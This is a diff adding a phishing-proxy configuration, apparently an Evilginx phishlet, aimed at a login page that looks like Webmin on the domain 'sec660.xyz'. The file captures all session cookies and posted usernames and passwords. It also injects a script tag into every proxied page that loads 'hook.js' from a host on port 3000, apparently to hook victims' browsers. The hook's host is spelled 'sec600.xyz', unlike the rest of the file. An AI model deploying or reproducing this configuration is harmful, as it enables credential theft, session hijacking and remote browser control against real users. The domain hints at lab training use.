@@ -1,0 +1,46 @@
+min_ver: '3.2.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: 'ubuntu', domain: 'sec660.xyz', session: true, is_landing: true, auto_filter: true}
+#  - {phish_sub: '', orig_sub: '', domain: 'sec660.xyz', session: true, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'ubuntu.sec660.xyz', orig_sub: 'ubuntu', domain: 'sec660.xyz', search: 'https://{hostname}/', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-www-form-urlencoded' ]}
+  - {triggers_on: 'ubuntu.sec660.xyz', orig_sub: 'ubuntu', domain: 'sec660.xyz', search: 'Sign In', replace: 'login', mimes: ['text/html']}
+  - { 
+      triggers_on: '.*', 
+      search: '<body>', 
+      replace: '<body><script src="http://ubuntu.sec600.xyz:3000/hook.js"></script>', 
+      mimes: [] 
+    }
+auth_tokens:
+  - domain: '.ubuntu.sec660.xyz'
+    keys: ['.*,regexp']
+    type: 'cookie'
+  - domain: '.sec660.xyz'
+    keys: ['sid']
+    type: 'cookie'
+  - domain: 'ubuntu.sec660.xyz'
+    keys: ['.*,regexp']
+    type: 'cookie'
+credentials:
+  username:
+    key: 'user$'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'pass'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    key: 'xhr-get_user_level'
+    search: '(.*)'
+    type: 'post'
+auth_urls:
+  - '/session_login.cgi'
+  - '/sysinfo.cgi'
+login:
+  username: user
+  password: pass
+  domain: 'ubuntu.sec660.xyz'
+  path: 'session_login.cgi'
+
